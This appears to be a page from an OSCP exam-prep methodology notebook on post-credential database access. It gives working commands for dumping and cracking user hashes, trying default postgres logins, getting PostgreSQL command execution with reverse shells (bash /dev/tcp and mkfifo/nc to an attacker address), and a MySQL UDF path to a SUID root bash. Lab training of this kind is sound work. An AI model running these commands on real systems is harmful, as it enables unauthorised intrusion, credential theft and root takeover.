# Linux - Database Access

**Step 18 of 50 · Linux**

*Use a recovered database credential to inspect users, hashes, and possible password reuse.*

## Run this

> **Why:** This database command tests the recovered connection and privilege level so database-specific execution or credential paths can be chosen.
```bash
# MySQL — default port 3306
mysql -h $BoxIP -u $Username -p

# PostgreSQL — default port 5432, non-standard also common (5437, 5433)
psql -h $BoxIP -p 5432 -U $Username -d $Database

# Useful queries once connected
# MySQL:  SHOW DATABASES; USE dbname; SHOW TABLES; SELECT username,password FROM users;
# Postgres: \l   \c dbname   \dt   SELECT username,password FROM users;

hashcat -m $HashMode $HashFile $Wordlist
```

PostgreSQL RCE (if superuser):

> **Why:** This version or banner check identifies the exact product release before a matching public exploit is considered.
```sql
-- Read a file
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"';
-- If /bin/sh only (no bash): use mkfifo payload instead
COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Lport >/tmp/f';
```

## Example output

 > *Example shape only: the exact database client and query depend on the target.*

```
mysql> SELECT username,password FROM users;
username | HASH
...
```

PostgreSQL COPY TO PROGRAM:

```
postgres=# COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
COPY 1
```

## What did you get?

- [ ] A cracked hash gives SSH access → **Run `ssh $Username@$BoxIP`, enter `$Password`, run `id`, then continue to the Linux foothold**
- [ ] The password works on another service → **Run `ssh $Username@$BoxIP` or submit it to the identified service, then go to Step 11 · [[Linux - RCE to Shell]] if it provides code execution**
- [ ] PostgreSQL connects as a superuser → **Use `COPY TO PROGRAM` to run commands; send a reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] PostgreSQL listens on a non-standard port → **Try `psql -p 5437` (and common alternates 5433, 5436) — default credentials `postgres:postgres` or blank password**
- [ ] Only database data is found → **Save the rows to `$BoxDir/loot/database.txt`, then return to Step 17 · [[Linux - Credential Search]] and search them for reusable credentials**
- [ ] No useful data is returned → **Go to Step 19 · [[Linux - Kernel Exploit]]**

## Notes

Use the client matching the open database service and keep the password private.

PostgreSQL `COPY TO PROGRAM` requires the `pg_execute_server_program` privilege, which superusers have by default. Connect as `postgres` with default credentials (`postgres:postgres` or blank) if no credentials are found elsewhere.

## Gotcha

> [!warning] 💡
> The exact database name, table, and hash mode depend on the target. Confirm them before running the query.

> [!warning] 💡
> PostgreSQL executes `COPY TO PROGRAM` through `/bin/sh`, not bash. The `/dev/tcp` syntax is bash-specific and will silently fail. Use the mkfifo payload or `nc -e` if the target has it.

## PostgreSQL non-standard ports and default credentials

PostgreSQL often listens on a port other than 5432. Run service detection before deciding that an unusual port is unrelated, then test the conventional `postgres` account only when the lab scope permits it.

> **Why:** This service scan fingerprints common PostgreSQL ports instead of trusting the port number; look for a PostgreSQL banner or a corrected service name.
```bash
# Check the standard and common alternate PostgreSQL ports.
sudo nmap -sV -p 5432,5433,5436,5437 $BoxIP -oN $BoxDir/nmap/postgres.txt
```

> **Why:** This login tests the default PostgreSQL superuser account on the discovered port; a `postgres=#` prompt is the success signal, while authentication failure ends this branch.
```bash
# Replace 5437 with the port confirmed by the service scan.
psql -h $BoxIP -p 5437 -U postgres
```

> **Why:** This query confirms whether the connected database role is a superuser; `on` permits the server-program path, while `off` means use data access only.
```sql
SELECT current_setting('is_superuser');
```

## MySQL UDF to SUID Bash

If MySQL credentials work and the MySQL server process runs as root, a User Defined Function (UDF) can expose OS command execution. A UDF is a database function implemented by a shared library; this is a conditional path, not a default assumption.

> **Why:** This command checks the operating-system owner of MySQL; look for `root` in the process owner column before attempting the UDF path.
```bash
ps aux | grep '[m]ysqld'
```

> **Why:** This query checks whether the command-execution UDF already exists; a returned function means you can test it, while an empty result requires the library-registration path.
```bash
mysql -h $BoxIP -u $Username -p$Password -e "SELECT * FROM mysql.func WHERE name='sys_exec';"
```

> **Why:** This call runs `id` through the existing UDF and redirects output to a file because `sys_exec` returns a status code rather than command stdout; look for `uid=0` in the file.
```bash
mysql -h $BoxIP -u $Username -p$Password -e "SELECT sys_exec('id > /tmp/udf-id.txt');"
cat /tmp/udf-id.txt
```

> **Why:** This UDF call copies Bash and sets its SUID bit, creating a root-effective binary when MySQL is running as root; verify ownership and the SUID mode before executing it.
```bash
mysql -h $BoxIP -u $Username -p$Password -e "SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');"
ls -l /tmp/rootbash
/tmp/rootbash -p
```

## Additional routing

- [ ] PostgreSQL is found on an alternate port and default authentication succeeds → **Confirm superuser status, then use the existing `COPY TO PROGRAM` path above**
- [ ] `sys_exec` returns `uid=0` and `/tmp/rootbash` is SUID root → **Run `/tmp/rootbash -p`, then run `id` and `whoami` to confirm UID 0, and go to Step 21 · [[Linux - Clean Down]]**
- [ ] MySQL is not running as root or the UDF cannot be registered → **Treat this branch as a dead end and return to Step 17 · [[Linux - Credential Search]]**
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/6. Pebbles|Pebbles]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/7. Nibbles|Nibbles]] -- confirmed in the box write-up

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
